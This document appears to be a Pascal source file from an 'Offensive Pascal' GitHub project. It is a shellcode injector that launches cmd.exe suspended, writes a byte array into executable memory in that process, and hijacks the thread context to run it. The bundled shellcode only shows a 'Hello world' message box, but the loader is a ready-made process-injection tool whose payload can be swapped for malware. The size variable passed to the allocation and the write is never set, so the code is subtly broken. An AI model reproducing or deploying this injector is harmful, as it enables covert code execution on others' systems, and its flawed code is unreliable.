{
  this one is part of repo published on github under the name of Offensive Pascal
  Pascal is a great and still up to date :)
  these projects can be compilied using FreePascal (FPC)
  or Delphi

  author : @zux0x3a
  site :   0xsp.com / ired.dev

  https://github.com/0xsp-SRD/OffensivePascal

 }


program injector;

{$mode delphi}

uses

  Classes,windows;



procedure inject_shell;
const
  //Windows x64 MessageBox Shellcode (434 bytes)
  shellcode:array[0..434] of BYTE = (
  $48,$83,$EC,$28,$48,$83,$E4,$F0,$48,$8D,$15,$66,$00,$00,$00,$48,$8D,$0D,$52,$00,$00,$00,$E8,$9E,$00,$00,$00,$4C,$8B,$F8,$48,$8D,$0D,$5D,$00,$00,$00,$FF,$D0,$48,$8D,$15,$5F,$00,$00,$00,$48,$8D,$0D,$4D,$00,$00,$00,$E8,$7F,$00,$00,$00,$4D,$33,$C9,$4C,$8D,$05,$61,$00,$00,$00,$48,$8D,$15,$4E,$00,$00,$00,$48,$33,$C9,$FF,$D0,$48,$8D,$15,$56,$00,$00,$00,$48,$8D,$0D,$0A,$00,$00,$00,$E8,$56,$00,$00,$00,$48,$33,$C9,$FF,$D0,$4B,$45,$52,$4E,$45,$4C,$33,$32,$2E,$44,$4C,$4C,$00,$4C,$6F,$61,$64,$4C,$69,$62,$72,$61,$72,$79,$41,$00,$55,$53,$45,$52,$33,$32,$2E,$44,$4C,$4C,$00,$4D,$65,$73,$73,$61,$67,$65,$42,$6F,$78,$41,$00,$48,$65,$6C,$6C,$6F,$20,$77,$6F,$72,$6C,$64,$00,$4D,$65,$73,$73,$61,$67,$65,$00,$45,$78,$69,$74,$50,$72,$6F,$63,$65,$73,$73,$00,$48,$83,$EC,$28,$65,$4C,$8B,$04,$25,$60,$00,$00,$00,$4D,$8B,$40,$18,$4D,$8D,$60,$10,$4D,$8B,$04,$24,$FC,$49,$8B,$78,$60,$48,$8B,$F1,$AC,$84,$C0,$74,$26,$8A,$27,$80,$FC,$61,$7C,$03,$80,$EC,$20,$3A,$E0,$75,$08,$48,$FF,$C7,$48,$FF,$C7,$EB,$E5,$4D,$8B,$00,$4D,$3B,$C4,$75,$D6,$48,$33,$C0,$E9,$A7,$00,$00,$00,$49,$8B,$58,$30,$44,$8B,$4B,$3C,$4C,$03,$CB,$49,$81,$C1,$88,$00,$00,$00,$45,$8B,$29,$4D,$85,$ED,$75,$08,$48,$33,$C0,$E9,$85,$00,$00,$00,$4E,$8D,$04,$2B,$45,$8B,$71,$04,$4D,$03,$F5,$41,$8B,$48,$18,$45,$8B,$50,$20,$4C,$03,$D3,$FF,$C9,$4D,$8D,$0C,$8A,$41,$8B,$39,$48,$03,$FB,$48,$8B,$F2,$A6,$75,$08,$8A,$06,$84,$C0,$74,$09,$EB,$F5,$E2,$E6,$48,$33,$C0,$EB,$4E,$45,$8B,$48,$24,$4C,$03,$CB,$66,$41,$8B,$0C,$49,$45,$8B,$48,$1C,$4C,$03,$CB,$41,$8B,$04,$89,$49,$3B,$C5,$7C,$2F,$49,$3B,$C6,$73,$2A,$48,$8D,$34,$18,$48,$8D,$7C,$24,$30,$4C,$8B,$E7,$A4,$80,$3E,$2E,$75,$FA,$A4,$C7,$07,$44,$4C,$4C,$00,$49,$8B,$CC,$41,$FF,$D7,$49,$8B,$CC,$48,$8B,$D6,$E9,$14,$FF,$FF,$FF,$48,$03,$C3,$48,$83,$C4,$28,$C3,$00,$00);



var
  pi: TProcessInformation;
  si: TStartupInfo;
  {$ifdef win32}
  ctx: Context;
  {$endif}

  {$ifdef win64}
  ctx : Pcontext;
  {$endif}
  remote_shellcodePtr: Pointer;
  {$ifdef win64}
  Written:dword64;
  {$endif}
   {$ifdef win32}
  Written:dword;
  {$endif}
  AppToLaunch: string;
  i ,s_size: Cardinal;
  shell_prt : string ;
 shell_code :  array of byte;

begin


AppToLaunch := 'notepad.exe';
UniqueString(AppToLaunch);

FillMemory( @si, sizeof( si ), 0 );
FillMemory( @pi, sizeof( pi ), 0 );

writeln('[+] Creating Process in Suspended Mode');

CreateProcess('c:\windows\system32\cmd.exe', PChar(AppToLaunch), nil, nil, False,
              CREATE_SUSPENDED,
              nil, nil,  si, pi );



 {$ifdef win32}
 ctx.ContextFlags := CONTEXT_CONTROL;
 GetThreadContext(pi.hThread,ctx);
 {$endif}

 {$ifdef win64}
  ctx := PCONTEXT(VirtualAlloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
  ctx.ContextFlags := CONTEXT_ALL;
  GetThreadContext(pi.hThread,ctx^);
 {$endif}


 //allocate the memory size
 remote_shellcodePtr:=VirtualAllocEx(pi.hProcess,Nil,s_size,MEM_COMMIT,
   PAGE_EXECUTE_READWRITE);

 // write array of bytes into process memory
 WriteProcessMemory(pi.hProcess,remote_shellcodePtr,@shellcode,s_size,written);


{$ifdef win64}
 ctx.rip:=dword64(remote_shellcodePtr);
 //ctx.ContextFlags := CONTEXT_CONTROL;
 SetThreadContext(pi.hThread,ctx^);
 ResumeThread(pi.hThread);
{$ENDIF}

{$ifdef win32}
 ctx.Eip:=integer(remote_shellcodePtr);
 ctx.ContextFlags := CONTEXT_CONTROL;
 SetThreadContext(pi.hThread,ctx);

 ResumeThread(pi.hThread);
{$endif}


 end;

begin
  inject_shell;
end.

